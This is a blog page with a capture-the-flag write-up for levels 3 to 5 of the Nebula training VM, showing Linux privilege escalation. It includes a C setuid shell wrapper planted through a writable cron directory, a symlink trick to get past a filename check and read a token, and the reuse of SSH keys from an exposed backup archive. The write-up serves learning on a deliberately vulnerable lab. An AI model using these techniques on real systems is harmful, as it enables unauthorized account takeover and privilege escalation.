<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="HandheldFriendly" content="True">
    <meta name="MobileOptimized" content="320">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="no-referrer">
    <meta name="description" content="">

    
      <link href="https://fonts.googleapis.com/css?family=Open+Sans:400|Old+Standard+TT:400&display=swap" rel="stylesheet" media="print" type="text/css" onload="this.media='all'">
    

    <title>
      
      
         Writeup: nebula (level 3 - level 5) 
      
    </title>
    <link rel="canonical" href="https://chuang76.github.io/posts/nebula_p2/">

    <style>
  * {
    border:0;
    font:inherit;
    font-size:100%;
    vertical-align:baseline;
    margin:0;
    padding:0;
    color: black;
    text-decoration-skip: ink;
  }

  body {
     
     
    font-family: 'Verdana'; 
     
     
    font-size:17px;
    line-height:160%;
    color:#1d1313;
    max-width:700px;
    margin:auto;
  }

  p {
    margin: 20px 0;
  }

  a img {
    border:none;
  }

  img {
    margin: 10px auto 10px auto;
    max-width: 100%;
    display: block;
  }

  .left-justify { float: left; }
  .right-justify { float:right; }

  pre, code {
    font: 12px Consolas, "Liberation Mono", Menlo, Courier, monospace;
    background-color: #f7f7f7;
  }

  code {
    font-size: 12px;
    padding: 4px;
  }

  pre {
    margin-top: 0;
    margin-bottom: 16px;
    word-wrap: normal;
    padding: 16px;
    overflow: auto;
    font-size: 85%;
    line-height: 1.45;
  }

  pre>code {
    padding: 0;
    margin: 0;
    font-size: 100%;
    word-break: normal;
    white-space: pre;
    background: transparent;
    border: 0;
  }

  pre code {
    display: inline;
    padding: 0;
    margin: 0;
    overflow: visible;
    line-height: inherit;
    word-wrap: normal;
    background-color: transparent;
    border: 0;
  }

  pre code::before,
  pre code::after {
    content: normal;
  }

  em,q,em,dfn {
    font-style:italic;
  }

  .sans,html .gist .gist-file .gist-meta {
    font-family:"Open Sans","Myriad Pro",Myriad,sans-serif;
  }

  .mono,pre,code,tt,p code,li code {
    font-family:Menlo,Monaco,"Andale Mono","lucida console","Courier New",monospace;
  }

  .heading,.serif,h1,h2,h3 {
    font-family:"Old Standard TT",serif;
  }

  strong {
    font-weight:600;
  }

  q:before {
    content:"\201C";
  }

  q:after {
    content:"\201D";
  }

  del,s {
    text-decoration:line-through;
  }

  blockquote {
    font-family:"Old Standard TT",serif;
    text-align:center;
    padding:50px;
  }

  blockquote p {
    display:inline-block;
    font-style:italic;
  }

  blockquote:before,blockquote:after {
    font-family:"Old Standard TT",serif;
    content:'\201C';
    font-size:35px;
    color:#403c3b;
  }

  blockquote:after {
    content:'\201D';
  }

  hr {
    width:40%;
    height: 1px;
    background:#403c3b;
    margin: 25px auto;
  }

  h1 {
    font-size:35px;
  }

  h2 {
    font-size:28px;
  }

  h3 {
    font-size:22px;
    margin-top:18px;
  }

  h1 a,h2 a,h3 a {
    text-decoration:none;
  }

  h1,h2 {
    margin-top:28px;
  }

  #sub-header, .date {
    color:#403c3b;
    font-size:13px;
  }

  #sub-header {
    margin: 0 4px;
  }

  #nav h1 a {
    font-size:35px;
    color:#1d1313;
    line-height:120%;
  }

  .posts_listing a,#nav a {
    text-decoration: none;
  }

  li {
    margin-left: 20px;
  }

  ul li {
    margin-left: 5px;
  }

  ul li {
    list-style-type: none;
  }
  ul li:before {
    content:"\00BB \0020";
  }

  #nav ul li:before, .posts_listing li:before {
    content:'';
    margin-right:0;
  }

  #content {
    text-align:left;
    width:100%;
    font-size:15px;
    padding:60px 0 80px;
  }

  #content h1,#content h2 {
    margin-bottom:5px;
  }

  #content h2 {
    font-size:25px;
  }

  #content .entry-content {
    margin-top:15px;
  }

  #content .date {
    margin-left:3px;
  }

  #content h1 {
    font-size:30px;
  }

  .highlight {
    margin: 10px 0;
  }

  .posts_listing {
    margin:0 0 50px;
  }

  .posts_listing li {
    margin:0 0 25px 15px;
  }

  .posts_listing li a:hover,#nav a:hover {
    text-decoration: underline;
  }

  #nav {
    text-align:center;
    position:static;
    margin-top:60px;
  }

  #nav ul {
    display: table;
    margin: 8px auto 0 auto;
  }

  #nav li {
    list-style-type:none;
    display:table-cell;
    font-size:15px;
    padding: 0 20px;
  }

  #links {
    display: flex;
    justify-content: space-between;
    margin: 50px 0 0 0;
  }

  #links :nth-child(1) {
    margin-right:0.5em;;
  }

  #links :nth-child(2) {
    margin-left:0.5em;;
  }

  #not-found {
    text-align: center;
  }

  #not-found a {
    font-family:"Old Standard TT",serif;
    font-size: 200px;
    text-decoration: none;
    display: inline-block;
    padding-top: 225px;
  }

  @media (max-width: 750px) {
    body {
      padding-left:20px;
      padding-right:20px;
    }

    #nav h1 a {
      font-size:28px;
    }

    #nav li {
      font-size:13px;
      padding: 0 15px;
    }

    #content {
      margin-top:0;
      padding-top:50px;
      font-size:14px;
    }

    #content h1 {
      font-size:25px;
    }

    #content h2 {
      font-size:22px;
    }

    .posts_listing li div {
      font-size:12px;
    }
  }

  @media (max-width: 400px) {
    body {
      padding-left:20px;
      padding-right:20px;
    }

    #nav h1 a {
      font-size:22px;
    }

    #nav li {
      font-size:12px;
      padding: 0 10px;
    }

    #content {
      margin-top:0;
      padding-top:20px;
      font-size:12px;
    }

    #content h1 {
      font-size:20px;
    }

    #content h2 {
      font-size:18px;
    }

    .posts_listing li div{
      font-size:12px;
    }
  }

  @media (prefers-color-scheme: dark) {
    *, #nav h1 a {
      color: #FDFDFD;
    }

    body {
      background: #121212;
    }

    pre, code {
      background-color: #262626;
    }

    #sub-header, .date {
      color: #BABABA;
    }

    hr {
      background: #EBEBEB;
    }
  }
</style>


    </head>

  <body>
    <section id=nav>
      <h1><a href="https://chuang76.github.io/">Before Dawn</a></h1>
      <ul>
        
      </ul>
    </section>


<section id=content>
  <h1> Writeup: nebula (level 3 - level 5) </h1>

  
    <div id=sub-header>
      December 2020 
    </div>
  

  <div class="entry-content">
    <p>Nebula is a virtual machine that covers a variety of challenges about Linux privilege escalation, scripting language issues, and file system race conditions. It is available at <a href="https://exploit-exercises.lains.space/">Exploit Exercises</a>.</p>
<!-- raw HTML omitted -->
<h2 id="level-3">Level 3</h2>
<p>The description of Level 3 is provided as follows.</p>
<pre><code>Check the home directory of flag03 and take note of the files there.

There is a crontab that is called every couple of minutes.

To do this level, log in as the level03 account with the password level03. 
Files for this level can be found in /home/flag03.
</code></pre><p>As you can see, there are one shell script and one directory in /home/flag03.</p>
<p><img src="https://github.com/chuang76/image/blob/master/03-1.PNG?raw=true" alt=""></p>
<p>Let&rsquo;s check the contents of writable.sh. It runs each file in the directory writable.d.</p>
<pre><code>#!/bin/sh
for i in /home/flag03/writable.d/* ; do
	(ulimit -t 5; bash -x &quot;$i&quot;)
	rm -f &quot;$i&quot;
done
</code></pre><p>According to the hint, there is a crontab in the system. <a href="https://en.wikipedia.org/wiki/Cron">Cron</a> (cron job) is a time-based job scheduler in Unix-based systems. It provides the user to run the jobs (commands or shell scripts) at fixed times. Its configure table, crontab (cron table), is used to specify the shell command to run periodically on a given schedule. We can check the contents of crontab in /etc directory.</p>
<p><img src="https://github.com/chuang76/image/blob/master/03-6.PNG?raw=true" alt=""></p>
<p>Let&rsquo;s check the cron mechanism with a simple experiment. Create a shell script in the writable.d while the shell script is going to create a file named &ldquo;test&rdquo; in /home/flag03. As you can see, after two minutes, a file named &ldquo;test&rdquo; was created in /home/flag03 indeed.</p>
<p><img src="https://github.com/chuang76/image/blob/master/03-2.PNG?raw=true" alt=""></p>
<p>So, to get the flag, we can create a shell script again, which executes our exploit program, in the writable.d. Since /tmp directory is world-writable. We can write our exploit program and compile it in /tmp. It is the same as the exploit program in <a href="https://chuang76.github.io/posts/nebula_p1/">Level 1</a>.</p>
<pre><code>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdio.h&gt;

int main(int argc, char** argv)
{
    gid_t gid = getegid();
    uid_t uid = geteuid();

    setresgid(gid, gid, gid);
    setresuid(uid, uid, uid);

    system(&quot;/bin/bash&quot;);
}
</code></pre><p><img src="https://github.com/chuang76/image/blob/master/03-3.PNG?raw=true" alt=""></p>
<p>Also, the shell script named run.sh contains the following commands.</p>
<pre><code>cp /tmp/vul /home/flag03/vul 
chmod u+s /home/flag03/vul
</code></pre><p>After a couple of minutes, cron runs the jobs (include shell scripts) in the system. Therefore, an executable named <code>vul</code> exists in /home/flag03. Besides, due to chmod command previously executed, we have the permission to run vul.</p>
<p><img src="https://github.com/chuang76/image/blob/master/03-4.PNG?raw=true" alt=""></p>
<p>Now, let&rsquo;s run this exploit executable to control the bash of the account flag03.</p>
<p><img src="https://github.com/chuang76/image/blob/master/03-5.PNG?raw=true" alt=""></p>
<!-- raw HTML omitted -->
<h2 id="level-4">Level 4</h2>
<p>The description of Level 4 is provided as follows.</p>
<pre><code>This level requires you to read the token file, but the code restricts the files 
that can be read. Find a way to bypass it :)

To do this level, log in as the level04 account with the password level04. 
Files for this level can be found in /home/flag04.
</code></pre><p>The source code is available.</p>
<pre><code>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;

int main(int argc, char **argv, char **envp)
{
      char buf[1024];
      int fd, rc;

      if(argc == 1) {
          printf(&quot;%s [file to read]\n&quot;, argv[0]);
          exit(EXIT_FAILURE);
      }

      if(strstr(argv[1], &quot;token&quot;) != NULL) {
          printf(&quot;You may not access '%s'\n&quot;, argv[1]);
          exit(EXIT_FAILURE);
      }

      fd = open(argv[1], O_RDONLY);
      if(fd == -1) {
          err(EXIT_FAILURE, &quot;Unable to open %s&quot;, argv[1]);
      }

      rc = read(fd, buf, sizeof(buf));

      if(rc == -1) {
          err(EXIT_FAILURE, &quot;Unable to read fd %d&quot;, fd);
      }

      write(1, buf, rc);
}
</code></pre><p>According to the source code, if we use &ldquo;token&rdquo; as the argument of flag04, we&rsquo;ll get the error message: You may not access token. However, we can perform an indirect way to view the contents of a restricted file. That is, create a symbolic link of the file token.</p>
<pre><code>$ ln -s [target] [target_symbolic]
</code></pre><p><img src="https://github.com/chuang76/image/blob/master/04-1.PNG?raw=true" alt=""></p>
<p>After we have made the symbolic link, we can execute target_symbolic file, just as we could with the target file. Now, we can read the contents of token as follows.</p>
<p><img src="https://github.com/chuang76/image/blob/master/04-2.PNG?raw=true" alt=""></p>
<p>Use the token as the password of account flag04, then we can get the flag.</p>
<p><img src="https://github.com/chuang76/image/blob/master/04-3.PNG?raw=true" alt=""></p>
<!-- raw HTML omitted -->
<h2 id="level-5">Level 5</h2>
<p>The description of Level 5 is provided as follows.</p>
<pre><code>Check the flag05 home directory. You are looking for weak directory permissions

To do this level, log in as the level05 account with the password level05. 
Files for this level can be found in /home/flag05.
</code></pre><p>We first check the contents in the directory /home/flag05.</p>
<p><img src="https://github.com/chuang76/image/blob/master/05-1.PNG?raw=true" alt=""></p>
<p>There is a compressed file in the directory .backup. Let&rsquo;s try to uncompress it. However, the error message indicates that we don&rsquo;t have the permission.</p>
<p><img src="https://github.com/chuang76/image/blob/master/05-2.PNG?raw=true" alt=""></p>
<p>To get rid of the permission issue, let&rsquo;s copy this file into /tmp directory.</p>
<p><img src="https://github.com/chuang76/image/blob/master/05-3.PNG?raw=true" alt=""></p>
<p>Now, we are able to uncompress the compressed file with tar command.</p>
<p><img src="https://github.com/chuang76/image/blob/master/05-4.PNG?raw=true" alt=""></p>
<p>After uncompressing the file, we obtain the public key, which helps us to log into a remotely as account flag05. <a href="https://en.wikipedia.org/wiki/SSH_(Secure_Shell)">SSH</a> (Secure shell) is a cryptographic network protocol. It provides users to control the remote servers over the Internet, such as login, remote command-line, to name a few.</p>
<p>Since SSH uses <a href="https://en.wikipedia.org/wiki/Public-key_cryptography">public-key cryptography</a> to authenticate and now we have the public key, we are allowed to log in remotely as the account flag05 without any passwords. Let&rsquo;s try it via ssh command.</p>
<pre><code>$ ssh flag05@localhost
</code></pre><p>As you can see, we log in as the account flag05.</p>
<p><img src="https://github.com/chuang76/image/blob/master/05-5.PNG?raw=true" alt=""></p>
<p>Here is the flag.</p>
<p><img src="https://github.com/chuang76/image/blob/master/05-6.PNG?raw=true" alt=""></p>

  </div>

  <div id=links>
    
      <a href="https://chuang76.github.io/posts/nebula_p1/">&laquo;&nbsp;Writeup: nebula (level 0 - level 2)</a>
    
    
      <a href="https://chuang76.github.io/posts/nebula_p3/">Writeup: nebula (level 6 - level 8)&nbsp;&raquo;</a>
    
  </div>
</section>

  
</body>
</html>



